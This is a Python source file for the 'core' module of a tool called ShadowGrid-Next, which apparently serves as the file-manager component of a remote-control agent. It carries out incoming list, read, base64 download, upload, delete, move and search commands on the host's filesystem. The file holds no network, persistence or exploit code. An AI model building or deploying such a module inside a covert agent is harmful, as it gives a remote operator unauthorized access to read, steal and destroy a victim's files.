"""ShadowGrid-Next 核心模块"""

import os
from modules.api import ModuleBase


class CoreModule(ModuleBase):
    @property
    def name(self):
        return "core"

    @property
    def description(self):
        return "核心模块 - ls/cd/pwd/cat/dl/ud/rm/mv/file/find"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def __init__(self):
        self.current_dir = os.getcwd()

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")

        if t == "ls":
            return self._ls(p)
        elif t == "cd":
            return self._cd(p)
        elif t == "pwd":
            return self._pwd()
        elif t == "cat":
            return self._cat(p)
        elif t == "dl":
            return self._dl(p)
        elif t == "ud":
            return self._ud(p)
        elif t == "rm":
            return self._rm(p)
        elif t == "mv":
            return self._mv(p)
        elif t == "file":
            return self._file(p)
        elif t == "find":
            return self._find(p)
        else:
            return {"status": "error", "result": f"Unknown command: {t}", "result_type": "error"}

    def get_commands(self):
        return ["ls", "cd", "pwd", "cat", "dl", "ud", "rm", "mv", "file", "find"]

    def _get_path(self, path=None):
        if not path or path in ('', '.'):
            return self.current_dir
        return os.path.normpath(os.path.join(self.current_dir, str(path)))

    def _ls(self, payload):
        try:
            path = self._get_path(payload)
            if not os.path.exists(path):
                return {"status": "error", "result": "Path not found", "result_type": "error"}
            if not os.path.isdir(path):
                return {"status": "error", "result": "Not a directory", "result_type": "error"}

            items = os.listdir(path)
            result = []
            for item in items:
                item_path = os.path.join(path, item)
                result.append({
                    "name": item,
                    "dir": os.path.isdir(item_path),
                    "size": os.path.getsize(item_path) if os.path.isfile(item_path) else None
                })
            return {"status": "ok", "result": result, "result_type": "list"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _cd(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Path required", "result_type": "error"}

            new_dir = self._get_path(payload)
            if not os.path.exists(new_dir) or not os.path.isdir(new_dir):
                return {"status": "error", "result": "Directory not found", "result_type": "error"}

            self.current_dir = os.path.abspath(new_dir)
            return {"status": "ok", "result": self.current_dir, "result_type": "dir"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _pwd(self):
        return {"status": "ok", "result": self.current_dir, "result_type": "dir"}

    def _cat(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            file_path = payload.get("path", "")
            if not file_path:
                return {"status": "error", "result": "Path required", "result_type": "error"}

            full_path = os.path.normpath(os.path.join(self.current_dir, str(file_path)))
            if not os.path.exists(full_path) or not os.path.isfile(full_path):
                return {"status": "error", "result": "File not found", "result_type": "error"}

            with open(full_path, 'rb') as f:
                data = f.read()
            return {
                "status": "ok",
                "result": data,
                "filename": os.path.basename(full_path),
                "result_type": "file"
            }
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _dl(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            file_path = payload.get("path", "")
            if not file_path:
                return {"status": "error", "result": "Path required", "result_type": "error"}

            full_path = os.path.normpath(os.path.join(self.current_dir, str(file_path)))
            if not os.path.exists(full_path) or not os.path.isfile(full_path):
                return {"status": "error", "result": "File not found", "result_type": "error"}

            import base64
            with open(full_path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            return {
                "status": "ok",
                "result": data,
                "filename": os.path.basename(full_path),
                "result_type": "file"
            }
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _ud(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            base64_data = payload.get("base64_data")
            save_as = payload.get("save_as", "")

            if not base64_data:
                return {"status": "error", "result": "Need base64_data", "result_type": "error"}
            if not save_as:
                return {"status": "error", "result": "Need save_as", "result_type": "error"}

            full_path = os.path.normpath(os.path.join(self.current_dir, str(save_as)))
            os.makedirs(os.path.dirname(full_path), exist_ok=True) if os.path.dirname(full_path) else None

            import base64
            with open(full_path, 'wb') as f:
                f.write(base64.b64decode(base64_data))

            return {"status": "ok", "result": "File saved", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _rm(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            path = payload.get("path", "")
            recursive = payload.get("recursive", False)

            if not path:
                return {"status": "error", "result": "Path required", "result_type": "error"}

            full_path = os.path.normpath(os.path.join(self.current_dir, str(path)))
            if not os.path.exists(full_path):
                return {"status": "error", "result": "Path not found", "result_type": "error"}

            if os.path.isdir(full_path):
                if recursive:
                    import shutil
                    shutil.rmtree(full_path)
                else:
                    os.rmdir(full_path)
            else:
                os.remove(full_path)

            return {"status": "ok", "result": "Deleted", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _mv(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            from_path = payload.get("from_path", "")
            to_path = payload.get("to_path", "")

            if not from_path or not to_path:
                return {"status": "error", "result": "Need paths", "result_type": "error"}

            src = os.path.normpath(os.path.join(self.current_dir, str(from_path)))
            dst = os.path.normpath(os.path.join(self.current_dir, str(to_path)))

            if not os.path.exists(src):
                return {"status": "error", "result": "Source not found", "result_type": "error"}

            os.makedirs(os.path.dirname(dst), exist_ok=True) if os.path.dirname(dst) else None
            os.rename(src, dst)

            return {"status": "ok", "result": "Moved", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _file(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            path = payload.get("path", "")
            if not path:
                return {"status": "error", "result": "Path required", "result_type": "error"}

            full_path = os.path.normpath(os.path.join(self.current_dir, str(path)))
            if not os.path.exists(full_path):
                return {"status": "error", "result": "Path not found", "result_type": "error"}

            if os.path.isfile(full_path):
                ext = os.path.splitext(full_path)[1].lower()
                types = {
                    '.txt': 'text', '.md': 'text', '.csv': 'text',
                    '.json': 'text', '.py': 'executable', '.sh': 'executable',
                    '.exe': 'executable', '.jpg': 'image', '.png': 'image',
                    '.pdf': 'pdf', '.zip': 'archive', '.mp4': 'video'
                }
                file_type = types.get(ext, 'file')
            elif os.path.isdir(full_path):
                file_type = 'directory'
            else:
                file_type = 'unknown'

            return {"status": "ok", "result": file_type, "result_type": "file"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _find(self, payload):
        try:
            if not payload:
                return {"status": "error", "result": "Need payload", "result_type": "error"}

            path = payload.get("path", ".")
            name = payload.get("name", "")
            file_type = payload.get("type", "")

            full_path = os.path.normpath(os.path.join(self.current_dir, str(path)))
            if not os.path.exists(full_path):
                return {"status": "error", "result": "Start path not found", "result_type": "error"}

            results = []
            name_lower = str(name).lower() if name else None

            for root, dirs, files in os.walk(full_path):
                if not file_type or file_type == 'f':
                    for f in files:
                        if not name_lower or name_lower in f.lower():
                            results.append({"path": os.path.join(root, f), "type": "file", "name": f})
                if not file_type or file_type == 'd':
                    for d in dirs:
                        if not name_lower or name_lower in d.lower():
                            results.append({"path": os.path.join(root, d), "type": "directory", "name": d})

            return {"status": "ok", "result": results, "result_type": "list"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = CoreModule()
